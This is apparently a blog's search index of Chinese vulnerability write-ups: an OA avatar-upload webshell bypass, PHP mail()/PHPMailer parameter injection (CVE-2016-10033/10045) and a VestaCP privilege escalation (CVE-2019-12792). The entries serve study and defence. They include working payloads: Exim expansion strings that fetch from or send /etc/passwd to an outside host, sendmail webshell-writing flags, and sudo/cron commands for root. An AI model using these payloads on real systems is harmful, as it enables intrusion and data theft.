<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>挖不到洞真的是你的问题嘛</title>
    <link href="/posts/1008/"/>
    <url>/posts/1008/</url>
    
    <content type="html"><![CDATA[<p>事情是这样，在一次渗透项目中发现了目标 OA 的一个弱口令，登入系统后找到了一处上传点。但在上传木马 Getshell 的时候遇到了大坑，相同的操作、JDK 版本、burpsuite 甚至连 burp 配置都一样我和同事同时测试却是两个截然不同的结果（同事按照我的思路 getshell 了，我还在冷风中摇曳像只傻狗）遂记录下来。<br>​</p><p>因为是开源 OA 先从源码简单分析下漏洞原理</p><p>定位到编辑资料上传头像处</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">if</span> (this.Fup.HasFile)<br>&#123;<br>        FileExtension[] fileEx = <span class="hljs-keyword">new</span> FileExtension[]<br>        &#123;<br>                FileExtension.GIF,<br>                FileExtension.JPG,<br>                FileExtension.PNG,<br>                FileExtension.BMP<br>        &#125;;<br>        <span class="hljs-keyword">if</span> (FileSystemManager.IsAllowedExtension(this.Fup, fileEx))<br>        &#123;<br>                <span class="hljs-built_in">string</span> userName = sys_UserInfo.UserName;<br>                <span class="hljs-built_in">string</span> <span class="hljs-keyword">text</span> = base.Server.MapPath(<span class="hljs-string">"~/Files/common/"</span>);<br>                <span class="hljs-built_in">string</span> text2 = userName + Path.GetExtension(this.Fup.FileName);<br>                <span class="hljs-keyword">text</span> += text2;<br>                this.Fup.PostedFile.SaveAs(<span class="hljs-keyword">text</span>);<br>                sys_UserInfo.PerPic = text2;<br>                this.Fup.Dispose();<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>判断文件合法性的方法</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> bool IsAllowedExtension(FileUpload fileUpload_0, FileExtension[] fileEx)<br>&#123;<br>        int contentLength = fileUpload_0.PostedFile.ContentLength;<br>        <span class="hljs-built_in">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[contentLength];<br>        fileUpload_0.PostedFile.InputStream.Read(buffer, <span class="hljs-number">0</span>, contentLength);<br>        MemoryStream memoryStream = <span class="hljs-keyword">new</span> MemoryStream(buffer);<br>        BinaryReader binaryReader = <span class="hljs-keyword">new</span> BinaryReader(memoryStream);<br>        <span class="hljs-built_in">string</span> <span class="hljs-keyword">text</span> = <span class="hljs-string">""</span>;<br>        <span class="hljs-keyword">try</span><br>        &#123;<br>                <span class="hljs-keyword">text</span> = binaryReader.ReadByte().ToString();<br>                <span class="hljs-keyword">text</span> += binaryReader.ReadByte().ToString();<br>        &#125;<br>        <span class="hljs-keyword">catch</span><br>        &#123;<br>        &#125;<br>        binaryReader.Close();<br>        memoryStream.Close();<br>        bool result;<br>        <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; i &lt; fileEx.Length; i++)<br>        &#123;<br>                FileExtension fileExtension = fileEx;<br>                <span class="hljs-keyword">if</span> (int.Parse(<span class="hljs-keyword">text</span>) == (int)fileExtension)<br>                &#123;<br>                        result = <span class="hljs-literal">true</span>;<br>                        <span class="hljs-keyword">return</span> result;<br>                &#125;<br>        &#125;<br>        result = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 FileExtension 为枚举类型，白名单</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> FileExtension<br>&#123;<br>        JPG = <span class="hljs-number">255216</span>,<br>        GIF = <span class="hljs-number">7173</span>,<br>        BMP = <span class="hljs-number">6677</span>,<br>        PNG = <span class="hljs-number">13780</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里判断文件合法性的操作并没有判断文件后缀，而是取文件内容前两个字节的十进制看是否在 FileExtension 里定义了。很经典的问题，我们可以制作上传图片马绕过或在木马 16 进制前添加两个字节写入枚举类型中任意一个。如 JPG 就是<code>FF D8</code>，<br><code>copy normal.jpg/b + shell.aspx/a shell.jpg</code><br>我一般习惯生成正常图片后缀的图片马，再使用 burp 抓包把图片后缀改为脚本后缀，免得遇到前端验证等的一些情况（别和我讲什么禁用 JS）</p><p>坑点就在改包的过程！下图是原始的包的文件名和文件内容的 HEX 形式<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1629358890521-c0218d4c-70b0-4e79-beec-1350595fa0da.png#clientId=ud7846cb3-bdf1-4&from=paste&height=208&id=ue7115554&margin=%5Bobject%20Object%5D&name=ce25cbf34495d2eccc602d35fad7c51.png&originHeight=189&originWidth=649&originalType=binary&ratio=1&size=15856&status=done&style=none&taskId=u004db300-57f1-4f9e-9270-4c30109772b&width=714.5" srcset="/img/loading.gif" lazyload alt="ce25cbf34495d2eccc602d35fad7c51.png"><br>然后在 RAW 包选中 jpg，修改为 aspx 再次查看<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1629358992145-f01167ab-8b1d-4b3b-8992-854bc18f2e27.png#clientId=ud7846cb3-bdf1-4&from=paste&height=176&id=u5ab3483c&margin=%5Bobject%20Object%5D&name=c56fc525e7414444330ac0f8a0413cd.png&originHeight=183&originWidth=720&originalType=binary&ratio=1&size=16932&status=done&style=none&taskId=u2652be74-ec15-4a5d-ac37-3f513f95bc9&width=692" srcset="/img/loading.gif" lazyload alt="c56fc525e7414444330ac0f8a0413cd.png"><br>可以看到图片文件头的几个字节全都变为了<code>ef bf bd</code>（破案万岁）通过和同事控制变量法最终得出结论：<del>我不适合挖洞</del>电脑字符集可能有问题。关于这个 UTF-8 字符可以看这篇文章<a href="https://liudanking.com/golang/utf-8_replacement_character/" target="_blank" rel="noopener">你应该记住的一个 UTF-8 字符「EF BF BD」</a><br>​</p><p>解决方法是直接在原始包的 HEX 选中指定字节进行编辑<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1629361973790-71aef7af-8724-40e8-90ed-d994bc5fe058.png#clientId=u00e18eda-b5cd-4&from=paste&height=141&id=u5cac192f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=282&originWidth=1918&originalType=binary&ratio=1&size=57448&status=done&style=none&taskId=u0998aee2-119b-4a4b-ba30-a0baeac36a8&width=959" srcset="/img/loading.gif" lazyload alt="image.png"></p><p>所以条条道路通罗马，求知欲和细心是最重要的。</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
    </categories>
    
    
    <tags>
      
      <tag>杂七杂八</tag>
      
      <tag>胡思乱想</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从PHP mail()学习参数注入漏洞</title>
    <link href="/posts/1007/"/>
    <url>/posts/1007/</url>
    
    <content type="html"><![CDATA[<p>这里引用 P 牛原话解释参数注入漏洞</p><blockquote><p>参数注入漏洞是指，在执行命令的时候，用户控制了命令中的某个参数，并通过一些危险的参数功能，达成攻击的目的。</p></blockquote><h2 id="0x00-Mail-函数简介"><a href="#0x00-Mail-函数简介" class="headerlink" title="0x00 Mail 函数简介"></a>0x00 Mail 函数简介</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">bool mail ( string <span class="hljs-variable">$to</span>  电子邮件收件人,或收件人列表<br>, string <span class="hljs-variable">$subject</span>       电子邮件的主题<br>, string <span class="hljs-variable">$message</span>       邮件内容<br>[, string <span class="hljs-variable">$additional_headers</span><br>[, string <span class="hljs-variable">$additional_parameters</span> ]] ) 许多web应用使用它设置发送者的地址和返回路径<br></code></pre></td></tr></table></figure><p>第五个参数（$additional_parameters），允许注入额外的参数给邮件发送程序，可以被注入恶意参数导致命令执行。在 Linux 系统上，mail 函数在底层由 MTA 邮件传输代理软件安装在系统上面，比如 sendmail、Exim、Postfix 等。</p><h2 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><p>以 CVE-2016-10033 为例，对比补丁分析<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1619170554938-66f3909a-e890-486e-99b5-35e3dacd03ad.png#clientId=u5cac55bb-f53a-4&from=paste&height=48&id=u43be3204&margin=%5Bobject%20Object%5D&name=image.png&originHeight=96&originWidth=1711&originalType=binary&size=114337&status=done&style=none&taskId=u49991ebc-440c-4be5-b880-f76c7dd0f75&width=855.5" srcset="/img/loading.gif" lazyload alt="image.png"><br>使用 escapeshellarg 来处理<code>$this-&gt;Sender</code>我们跟随<code>$param</code>的走向可知<code>$param</code>最终会被 mail 函数使用，在<code>class.phpmailer.php</code>的<code>mailPassthru</code>函数中<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1619170727260-20329011-cd6a-4dcc-8f34-25b1675e2030.png#clientId=u5cac55bb-f53a-4&from=paste&height=365&id=uf42c9004&margin=%5Bobject%20Object%5D&name=image.png&originHeight=365&originWidth=748&originalType=binary&size=64379&status=done&style=none&taskId=u9567c337-fafb-4a6c-a568-891db087c81&width=748" srcset="/img/loading.gif" lazyload alt="image.png"><br>位于<code>\wp-includes\pluggable.php</code>中 wp_mail 函数调用 setFrom 设置 phpmailer<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1619067903394-c74b6514-d5e7-42be-8441-6eebd6499fa9.png#clientId=u5cac55bb-f53a-4&from=paste&id=uecb72e30&margin=%5Bobject%20Object%5D&name=image.png&originHeight=689&originWidth=1059&originalType=binary&size=118043&status=done&style=none&taskId=u86aa0f05-7864-4d9a-af00-cd009ba88e9" srcset="/img/loading.gif" lazyload alt="image.png"><br>当调用 WordPress wp_mail()函数(忘记密码，注册用户)发送邮件时，WordPress 会根据<code>$SERVER_NAME</code>设置邮件域<code>$from_email=&#39;wordpress@&#39;.$sitename;</code>经过过滤之后传给易受攻击的 phpmailer 的 setFrom 函数。而<code>$SERVER_NAME</code>可以通过 http 中的 HOST 头赋值。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /wp-login.php?action=lostpassword HTTP/1.1<br>Host: inject<br>Connection: keep-alive<br>Content-Length: 99<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Upgrade-Insecure-Requests: 1<br>Origin: http://120.55.42.95:8080<br>Content-Type: application/x-www-form-urlencoded<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Referer: http://127.0.0.1:8080/wp-login.php?action=lostpassword<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Cookie: wordpress_test_cookie=WP+Cookie+check; wp-settings-time-1=1618994337; JSESSIONID=22E4F619EA19279F411F77FB5E3CB2C6<br><br>user_login=Admin%40foxmail.com&amp;redirect_to=&amp;wp-submit=%E8%8E%B7%E5%8F%96%E6%96%B0%E5%AF%86%E7%A0%81<br></code></pre></td></tr></table></figure><p>如上请求将会传递以下参数给<code>/usr/sbin/sendmail</code>，并以<code>sh</code>执行<br><code>/usr/sbin/sendmail [-t] [-i] [-f wordpress@inject]</code><br>其中-t 和-i 参数由 PHP 自动添加。参数-t 使 sendmail 从标准输入中提取头，-i 阻止 sendmail 将<code>.</code>作为输入的结尾。-f 来自于 mail()函数的 additional_parameters。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">execve(<span class="hljs-string">"/bin/sh"</span>,<br>       [<span class="hljs-string">"sh"</span>, <span class="hljs-string">"-c"</span>, <span class="hljs-string">"/usr/sbin/sendmail -t -i -f wordpress@inject extra"</span>],<br>       [/* 24 environment vars */])<br></code></pre></td></tr></table></figure><p>一般针对<strong>Sendmail MTA</strong>我们有以下几种攻击方法</p><h3 id="X-任意文件写"><a href="#X-任意文件写" class="headerlink" title="-X 任意文件写"></a><del>-X 任意文件写</del></h3><p>-X logfile 是记录 log 文件的，就是可以写文件；<br><code>/usr/bin/sendmail –t –i -f 123@456 -OQueueDirectory=/tmp/ -X/var/www/shell.php</code><br>可简化为<code>/usr/bin/sendmail –t –i -f 123@456 -oQ=/tmp/ -X./shell.php</code></p><h3 id="C-任意文件读"><a href="#C-任意文件读" class="headerlink" title="-C 任意文件读 ~"></a><del>-C 任意文件读 ~</del></h3><p>-C //file 是临时加载一个配置文件，就是可以读文件；<br><code>/usr/sbin/sendmail -i -t -C/etc/passwd -X/tmp/output.txt</code></p><h3 id="O-覆盖配置文件执行代码"><a href="#O-覆盖配置文件执行代码" class="headerlink" title="-O 覆盖配置文件执行代码 ~"></a><del>-O 覆盖配置文件执行代码 ~</del></h3><p>-O //option=value 是临时设置一个邮件存储的临时目录的配置。<br><code>/usr/bin/sendmail –t –i -f 123@456 -oQ/tmp -X./upload/sendmail_cf</code></p><p>但实际上 wordpress 对 server_name 传入值进行了 strtolower 处理，且 Linux 区分大小写故以上攻击方法均失效。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@iZbp19ryeo1038lmdsso1pZ ~]<span class="hljs-comment"># whereis sendmail</span><br>sendmail: /usr/sbin/sendmail /usr/sbin/sendmail.postfix /usr/lib/sendmail /usr/lib/sendmail.postfix /usr/share/man/man8/sendmail.8.gz<br>[root@iZbp19ryeo1038lmdsso1pZ ~]<span class="hljs-comment"># file /usr/sbin/sendmail</span><br>/usr/sbin/sendmail: symbolic link to `/etc/alternatives/mta<span class="hljs-string">'</span><br></code></pre></td></tr></table></figure><p><strong>Sendmail EXIM</strong>支持开启 exim4 字符串扩展，可通过-be 参数注入参数。我们可以利用以下扩展内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$&#123;run&#123;&lt;command&gt; &lt;args&gt;&#125;</span>&#123;&lt;string1&gt;&#125;&#123;&lt;string2&gt;&#125;&#125;<br>//执行命令&lt;<span class="hljs-built_in">command</span>&gt; &lt;args&gt;，成功返回string1，失败返回string2<br><br><span class="hljs-variable">$&#123;substr&#123;&lt;string1&gt;&#125;</span>&#123;&lt;string2&gt;&#125;&#123;&lt;string3&gt;&#125;&#125;<br>//字符串的截取，在string3中从string1开始截取string2个字符<br><br><span class="hljs-variable">$&#123;readfile&#123;&lt;file name&gt;&#125;</span>&#123;&lt;eol string&gt;&#125;&#125;<br>//读文件file name，以eol string分割<br><br><span class="hljs-variable">$&#123;readsocket&#123;&lt;name&gt;&#125;</span>&#123;&lt;request&gt;&#125;&#123;&lt;timeout&gt;&#125;&#123;&lt;eol string&gt;&#125;&#123;&lt;fail string&gt;&#125;&#125;<br>//发送socket消息，消息内容为request<br></code></pre></td></tr></table></figure><p>在很多时候,很多特殊符号不能直接出现在 payload 中如：/，空格等。在 HOST 标头中出现<code>/</code>就会报 500 错误。这个时候我们就可以从环境变量中取值截取我们想要的字符。<br>Dawid Golunski 找到一个内部 exim 变量<code>${tod_log}</code>中包含空格，<code>${spool_directory}</code>包含<code>/</code>。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1619151491109-61a7e77a-c644-41d1-a923-4f7786b7d951.png#clientId=u5cac55bb-f53a-4&from=paste&height=73&id=u17206e09&margin=%5Bobject%20Object%5D&name=image.png&originHeight=73&originWidth=435&originalType=binary&size=15603&status=done&style=none&taskId=u38f8ae6b-83c8-4bbf-88ba-3c574b83b91&width=435" srcset="/img/loading.gif" lazyload alt="image.png"><br>故接下来就可以用<code>${substr{0}{1}{$spool_directory}}</code>代替<code>/</code>，用<code>${substr{10}{1}{$tod_log}}</code>代替空格。</p><h3 id="run-执行命令"><a href="#run-执行命令" class="headerlink" title="${run{}{}}执行命令"></a>${run{}{}}执行命令</h3><p>/usr/sbin/sendmail  –t  –i  -f  root@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}curl${substr{10}{1}{$tod_log}}10.5.1.2${substr{13}{1}{$tod_log}}9999${substr{0}{1}{$spool_directory}}rce.txt}}<br>可以通过外带数据将将命令执行结果取出来，也可反弹 shell，写 webshell 等<br><a href="https://github.com/vulhub/vulhub/blob/master/wordpress/pwnscriptum/" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/wordpress/pwnscriptum/</a></p><h3 id="readfile-读文件"><a href="#readfile-读文件" class="headerlink" title="${readfile{}{}}读文件"></a>${readfile{}{}}读文件</h3><p>/usr/sbin/sendmail  –t  –i  -f  root@localhost -be ${readsocket{inet${substr{13}{1}{$tod_log}}10.5.1.2${substr{13}{1}{$tod_log}}9999}{${readfile{${substr{0}{1}{$spool_directory}}etc${substr{0}{1}{$spool_directory}}passwd}{}}}{3s}{}{failure}}</p><h2 id="0x02-escapeshellarg-和-escapeshellcmd-混用导致的-Bypass"><a href="#0x02-escapeshellarg-和-escapeshellcmd-混用导致的-Bypass" class="headerlink" title="0x02 escapeshellarg 和 escapeshellcmd 混用导致的 Bypass"></a>0x02 escapeshellarg 和 escapeshellcmd 混用导致的 Bypass</h2><p>还是以 CVE-2016-10033 为例，它修复的方法为使用 escapeshellcmd 对$this-&gt;sender 进行处理<br>，而 phpmailer 在内部已经实现了 escapeshellarg，因两者的不恰当使用导致了 Bypass。先来科普以下 escapeshellarg 和 escapeshellcmd</p><h3 id="escapeshellarg"><a href="#escapeshellarg" class="headerlink" title="escapeshellarg"></a>escapeshellarg</h3><ol><li>确保用户只传递一个参数给命令</li><li>用户不能指定更多的参数一个</li><li>用户户不能执行不同的命令</li></ol><p>将给字符串增加一对单引号并且转义任何已经存在的单引号</p><h3 id="escapeshellcmd"><a href="#escapeshellcmd" class="headerlink" title="escapeshellcmd"></a>escapeshellcmd</h3><ol><li>确保用户只执行一个命令</li><li>用户可以指定不限数量的参数</li><li>用户不能执行不同的命令</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&amp; <span class="hljs-comment"># ; ` | * ? ~ &lt; &gt; ^ ( ) [ ] &#123; &#125; $\ \x0A \xFF//这些字符以及不配对' "会被转义</span><br></code></pre></td></tr></table></figure><p>当一个参数经过 escapeshellarg 又经过 escapeshellcmd 处理时</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">$cmd = escapeshellcmd(escapeshellarg($cmd));<br></code></pre></td></tr></table></figure><p>如果此时 cmd 输入为 1’<br>那经过 escapeshellarg 就会变为<code>&#39;1&#39;\&#39;&#39;&#39;</code><br>再经过 escapeshellcmd 处理就变为<code>&#39;1&#39;\\&#39;&#39;\&#39;</code>,此时’已经逃了出来。又造成了参数逃逸（CVE-2016-10045）</p><h2 id="0x03-Reference"><a href="#0x03-Reference" class="headerlink" title="0x03 Reference"></a>0x03 Reference</h2><p>[1] <a href="https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html" target="_blank" rel="noopener">https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html</a><br>[2] <a href="https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html" target="_blank" rel="noopener">https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html</a><br>[3] <a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98" target="_blank" rel="noopener">http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98</a><br>[4] <a href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
      <category>参数注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
      <tag>参数注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[CVE-2019-12792]Vesta控制面板0.9.8-24-上载处理程序中的权限提升漏洞分析</title>
    <link href="/posts/1006/"/>
    <url>/posts/1006/</url>
    
    <content type="html"><![CDATA[<p>前几天看到了一篇<a href="https://blog.fadyothman.com/cve-2021-28379-gaining-rce-via-ssh-backdoor-in-vestacp/" target="_blank" rel="noopener">CVE-2021-28379</a>分析文章，觉得很有意思就自己动手分析了一遍。后边又搜了一下 VestaCP 的历史漏洞，一不做二不休干脆全都复现一遍。而当复现到 CVE-2019-12792，我是怎么复现也不能复现成功。最后才发现我分析的是旧版本 0.98-24 的源码，搭的环境用的却是最新版本 0.98-26。呜呜被自己蠢哭了…</p><h1 id="0x01-CVE-2019-12792-的漏洞成因"><a href="#0x01-CVE-2019-12792-的漏洞成因" class="headerlink" title="0x01 CVE-2019-12792 的漏洞成因"></a>0x01 CVE-2019-12792 的漏洞成因</h1><p>定位漏洞文件，在<code>/web/upload/UploadHandler.php</code>中<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1618907871491-92aa90ee-828f-4e32-8d5f-7ed06a40d4c0.png#clientId=uf9b44e06-6d5f-4&from=paste&height=203&id=ufdc7c285&margin=%5Bobject%20Object%5D&name=image.png&originHeight=264&originWidth=1076&originalType=binary&size=60729&status=done&taskId=u5d0358a5-1af4-4815-9808-770e2fd25e1&width=826" srcset="/img/loading.gif" lazyload alt="image.png"><br>file_path 为上传文件的文件名，用户可控。同时在 exec VESTA_CMD 中充当<code>v-copy-fs-file</code>的参数，并只用了<code>&#39;&#39;</code>包裹。可将文件名用单引号引起来并以用户身份 admin（在 VestaCP 中运行 Web 服务器的用户）盲目运行其他命令。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1618913058769-ab67feba-daaf-4022-8601-5601ee0e6e31.png#clientId=uf9b44e06-6d5f-4&from=paste&height=417&id=ub5e1ac6c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=585&originWidth=970&originalType=binary&size=105847&status=done&style=none&taskId=ud8aa9253-8647-4732-a84b-2e4203c6e89&width=691" srcset="/img/loading.gif" lazyload alt="image.png"></p><h2 id="提权到-ROOT-获取"><a href="#提权到-ROOT-获取" class="headerlink" title="提权到 ROOT 获取"></a>提权到 ROOT 获取</h2><h3 id="1-滥用-v-start-service-命令"><a href="#1-滥用-v-start-service-命令" class="headerlink" title="1. 滥用 v-start-service 命令"></a>1. 滥用 v-start-service 命令</h3><p>该 service 系统命令提供一种方式来执行任意的可执行文件和不仅初始化脚本。由于 v-start-service 只是一个包装 service，因此可以利用它来运行任意可执行文件 root。<br>COMMAND 如下设置变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ COMMAND=<span class="hljs-string">'</span><br><span class="hljs-string">    echo "id &gt;/usr/local/vesta/web/proof" &gt;/tmp/x</span><br><span class="hljs-string">    chmod +x /tmp/x</span><br><span class="hljs-string">    sudo /usr/local/vesta/bin/v-start-service ../../tmp/x'</span><br></code></pre></td></tr></table></figure><p>运行上述其余命令，然后检查是否在 Web 服务器根目录中创建了证明文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl -k https://target.com:8083/proof<br>uid=0(root) gid=0(root) groups=0(root)<br></code></pre></td></tr></table></figure><h3 id="2-使用-cron-计划任务"><a href="#2-使用-cron-计划任务" class="headerlink" title="2. 使用 cron 计划任务"></a>2. 使用 cron 计划任务</h3><p>admin 用户合法执行 root 命令的一种简单方法是替换/etc/crontab 文件，然后使用 v-change-sys-service-configVestaCP 实用程序重新启动 cron 守护程序。COMMAND 如下设置变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ COMMAND=<span class="hljs-string">'</span><br><span class="hljs-string">    echo "* * * * * root id &gt;/usr/local/vesta/web/proof" &gt;/tmp/x</span><br><span class="hljs-string">    sudo /usr/local/vesta/bin/v-change-sys-service-config /tmp/x cron yes'</span><br></code></pre></td></tr></table></figure><p>运行上述其余命令，然后在一分钟后检查是否在 Web 服务器根目录中创建了证明文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl -k https://target.com:8083/proof<br>uid=0(root) gid=0(root) groups=0(root)<br></code></pre></td></tr></table></figure><h1 id="0x02-漏洞修复"><a href="#0x02-漏洞修复" class="headerlink" title="0x02 漏洞修复"></a>0x02 漏洞修复</h1><p>漏洞修复的一劳永逸，用了 escapeshellarg 对 file_path 进行处理。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/8398873/1618917112156-4e74e614-4456-49cc-a05e-9e96e9ba158e.png#clientId=uf9b44e06-6d5f-4&from=paste&height=72&id=u0b104f6b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=89&originWidth=1187&originalType=binary&size=27162&status=done&style=none&taskId=ue3a59ce5-3985-4d80-8872-4a81695889b&width=961" srcset="/img/loading.gif" lazyload alt="image.png"></p><h1 id="0x03-Reference"><a href="#0x03-Reference" class="headerlink" title="0x03 Reference"></a>0x03 Reference</h1><p>[1] <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-15494/Vestacp.html" target="_blank" rel="noopener">https://www.cvedetails.com/vulnerability-list/vendor_id-15494/Vestacp.html</a><br>[2] <a href="https://cardaci.xyz/advisories/2019/08/12/vesta-control-panel-0.9.8-24-privilege-escalation-in-the-upload-handler" target="_blank" rel="noopener">https://cardaci.xyz/advisories/2019/08/12/vesta-control-panel-0.9.8-24-privilege-escalation-in-the-upload-handler</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[CVE-2021-28379]VestaCP 0.9.8 File Upload CSRF漏洞分析</title>
    <link href="/posts/1005/"/>
    <url>/posts/1005/</url>
    
